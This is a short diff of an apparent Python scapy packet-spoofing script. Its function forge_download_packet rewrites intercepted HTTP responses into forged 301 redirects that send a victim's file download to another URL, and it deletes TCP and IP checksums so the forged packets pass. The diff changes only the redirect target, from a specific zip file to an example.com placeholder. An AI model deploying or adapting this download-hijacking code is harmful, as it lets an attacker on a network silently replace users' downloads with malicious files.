@@ -50,11 +50,11 @@ def filter_packets(packet):
 
 
 def forge_download_packet(packet):
-	packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.tachibanalaboratories.net/soykaf/Mathematics/MATH1061%20revision.zip\n\n"
+	packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.com/target_file.zip\n\n"
 	packet[http.HTTPResponse].Http_Version = "HTTP/1.1"
 	packet[http.HTTPResponse].Status_Code = "301"
 	packet[http.HTTPResponse].Reason_Phrase = "Moved Permanently"
-	packet[http.HTTPResponse].Location = "http://www.tachibanalaboratories.net/soykaf/Mathematics/MATH1061%20revision.zip"
+	packet[http.HTTPResponse].Location = "http://www.example.com/target_file.zip"
 	del packet[scapy.TCP].chksum
 	del packet[scapy.IP].chksum
 	del packet[scapy.IP].len
